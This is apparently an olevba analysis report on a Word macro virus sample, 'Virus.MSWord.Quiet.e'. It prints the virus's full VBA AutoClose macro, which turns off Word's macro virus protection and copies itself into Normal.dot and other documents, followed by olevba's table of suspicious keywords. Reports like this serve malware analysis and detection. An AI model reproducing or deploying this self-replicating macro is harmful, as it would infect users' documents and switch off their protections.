olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quiet.e-0b1778d2c2fef471180cec9c2dbe204e8e9a3729
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quiet.e-0b1778d2c2fef471180cec9c2dbe204e8e9a3729 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Äåáèëèçàòîð v 4.1  Copyright(c) Slim Fox, 1997 - 2000

Sub AutoClose()
    Options.VirusProtection = False
    On Error GoTo exit_1
    Set ud = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    If ud.Lines(1, 1) = nt.Lines(1, 1) Then GoTo exit_1
    If MacroContainer = "Normal.dot" Then
        Set tm = ud
        Set ud = nt
        Set nt = tm
    End If
    nt.deletelines 1, nt.CountofLines
    Count = ud.CountofLines
    ls = ud.Lines(1, Count)
    nt.InsertLines 1, ls
    nt.replaceline 3, "Sub AutoClose()"
   'sss
exit_1:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

